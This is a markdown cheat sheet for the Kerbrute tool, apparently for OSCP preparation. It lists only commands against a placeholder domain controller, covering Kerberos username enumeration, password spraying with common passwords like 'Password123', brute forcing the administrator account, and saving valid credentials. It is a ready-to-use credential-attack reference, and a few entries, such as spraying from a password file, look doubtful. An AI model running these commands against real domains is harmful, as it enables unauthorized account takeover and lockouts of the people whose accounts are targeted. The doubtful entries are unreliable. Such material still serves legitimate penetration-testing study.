# Kerbrute

```
# User Enumeration
kerbrute userenum --dc 10.10.10.10 -d example.com users.txt

# User Enumeration with Threads
kerbrute userenum --dc 10.10.10.10 -d example.com users.txt -t 50

# User Enumeration with Output File
kerbrute userenum --dc 10.10.10.10 -d example.com users.txt -o valid_users.txt

# Password Spraying
kerbrute passwordspray --dc 10.10.10.10 -d example.com users.txt 'Password123'

# Password Spraying with Delay
kerbrute passwordspray --dc 10.10.10.10 -d example.com users.txt 'Winter2024!' --delay 1000

# Password Spraying with Safe Mode
kerbrute passwordspray --dc 10.10.10.10 -d example.com users.txt 'Password123' --safe

# Brute Force Single User
kerbrute bruteuser --dc 10.10.10.10 -d example.com passwords.txt administrator

# Brute Force Multiple Users
kerbrute bruteforce --dc 10.10.10.10 -d example.com combos.txt

# Username and Password Combo Attack
kerbrute bruteforce --dc 10.10.10.10 -d example.com userpass.txt

# Check Single Username
kerbrute userenum --dc 10.10.10.10 -d example.com single_user.txt

# Specify Domain Controller by Hostname
kerbrute userenum --dc dc01.example.com -d example.com users.txt

# Use UDP Instead of TCP
kerbrute userenum --dc 10.10.10.10 -d example.com users.txt --udp

# Increase Threads
kerbrute userenum --dc 10.10.10.10 -d example.com users.txt -t 100

# Verbose Output
kerbrute userenum --dc 10.10.10.10 -d example.com users.txt -v

# Save Valid Logins
kerbrute passwordspray --dc 10.10.10.10 -d example.com users.txt 'Password123' -o spray_results.txt

# Enumerate Users Quietly
kerbrute userenum --dc 10.10.10.10 -d example.com users.txt --safe

# Stop on Success
kerbrute bruteuser --dc 10.10.10.10 -d example.com passwords.txt administrator --stop-on-success

# Use Custom Domain
kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt

# Enumerate from Seclists
kerbrute userenum --dc 10.10.10.10 -d example.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Password Spray from File
kerbrute passwordspray --dc 10.10.10.10 -d example.com users.txt passwords.txt

# Check Kerberos Preauth Responses
kerbrute userenum --dc 10.10.10.10 -d example.com users.txt --hash-file hashes.txt

# Common OSCP Commands
kerbrute userenum --dc 10.10.10.10 -d example.com users.txt
kerbrute passwordspray --dc 10.10.10.10 -d example.com users.txt 'Password123'
kerbrute bruteuser --dc 10.10.10.10 -d example.com passwords.txt administrator
kerbrute userenum --dc 10.10.10.10 -d example.com users.txt -o valid_users.txt
kerbrute passwordspray --dc 10.10.10.10 -d example.com users.txt 'Winter2024!' --safe
```
